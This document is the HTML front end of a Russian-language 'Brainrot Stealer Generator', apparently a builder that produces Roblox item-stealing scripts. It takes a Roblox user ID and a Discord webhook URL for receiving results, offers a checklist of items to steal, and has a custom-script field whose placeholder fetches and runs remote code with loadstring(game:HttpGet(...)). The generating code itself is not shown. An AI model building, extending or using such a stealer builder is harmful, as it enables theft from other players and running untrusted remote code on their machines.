<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brainrot Stealer Generator</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="background"></div>
    <div class="container">
        <h1>🎯 Генератор Brainrot Stealer</h1>
        
        <div class="form-group">
            <label>👤 Roblox Nickname</label>
            <input type="text" id="robloxNick" placeholder="sdfgrijjkdsfg">
        </div>
        
        <div class="form-group">
            <label>🆔 Roblox User ID</label>
            <input type="text" id="robloxId" placeholder="8986116710">
        </div>
        
        <div class="form-group">
            <label>🔗 Discord Webhook URL</label>
            <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
        </div>
        
        <div class="form-group">
            <label>🎯 Таргет брейнроты (STEAL)</label>
            <div class="select-buttons">
                <button type="button" id="selectAllBtn" class="btn-small">✅ Выбрать всех</button>
                <button type="button" id="deselectAllBtn" class="btn-small">❌ Убрать всех</button>
            </div>
            <input type="text" id="searchBrainrots" class="search-input" placeholder="🔍 Поиск...">
            <div class="checkbox-grid" id="brainrotsList"></div>
        </div>
        
        <div class="form-group">
            <label>📦 Дополнительный скрипт</label>
            <div class="radio-group">
                <label class="radio-label"><input type="radio" name="scriptType" value="22s" checked> 22s Hub</label>
                <label class="radio-label"><input type="radio" name="scriptType" value="custom"> Свой скрипт</label>
            </div>
            <textarea id="customScript" placeholder="loadstring(game:HttpGet('ссылка'))()" style="display: none;"></textarea>
        </div>
        
        <div class="buttons">
            <button id="generateBtn" class="btn-primary">🚀 СГЕНЕРИРОВАТЬ</button>
            <button id="copyBtn" class="btn-copy" style="display: none;">📋 КОПИРОВАТЬ</button>
        </div>
        
        <div id="output" style="display: none;">
            <h3>📜 Сгенерированный скрипт:</h3>
            <pre id="scriptOutput"></pre>
        </div>
        
        <div class="footer">
            <button id="discordBtn" class="discord-btn">💬 DISCORD</button>
            <div class="credits">created by <span class="gradient-text">architect</span></div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
